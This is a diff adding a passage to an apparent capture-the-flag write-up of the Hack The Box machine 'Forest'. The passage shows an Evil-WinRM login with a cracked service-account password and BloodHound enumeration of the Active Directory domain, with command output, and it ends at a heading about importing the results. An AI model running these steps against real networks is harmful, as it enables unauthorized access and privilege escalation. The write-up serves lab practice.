@@ -744,3 +744,55 @@ s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)
 Waiting for 3 children to terminate
 Session completed. 
 ```
+
+## Evil-WinRM
+
+Connect to the target using the user *svc-alfresco* and the creds we just cracked
+
+```bash
+┌─[us-dedivip-1]─[10.10.14.63]─[lemagickonch@htb-pukfvgtk0k]─[~/Desktop]
+└──╼ [★]$ evil-winrm -i 10.129.200.84 -u svc-alfresco -p s3rvice
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents>
+```
+
+From here we can get the user flag located at *C:\Users\svc-alfresco\Desktop*
+
+# **Privilege Escalation**
+
+## Remote Bloodhound
+
+Since we have credentials to a valid user we can run BloodHound on the domain to see if there are any easy paths to get further privs
+
+```bash
+┌─[us-dedivip-1]─[10.10.14.63]─[lemagickonch@htb-pukfvgtk0k]─[~/Desktop]
+└──╼ [★]$ bloodhound-python -u svc-alfresco -p s3rvice -ns 10.129.200.84 -d htb.local -c All
+INFO: Found AD domain: htb.local
+INFO: Getting TGT for user
+WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (FOREST.htb.local:88)] [Errno -2] Name or service not known
+INFO: Connecting to LDAP server: FOREST.htb.local
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 2 computers
+INFO: Connecting to LDAP server: FOREST.htb.local
+INFO: Found 33 users
+INFO: Found 76 groups
+INFO: Found 2 gpos
+INFO: Found 15 ous
+INFO: Found 20 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: EXCH01.htb.local
+INFO: Querying computer: FOREST.htb.local
+INFO: Done in 00M 04S
+```
+
+#### Start Bloodhound and Import the JSONs from the above command
+
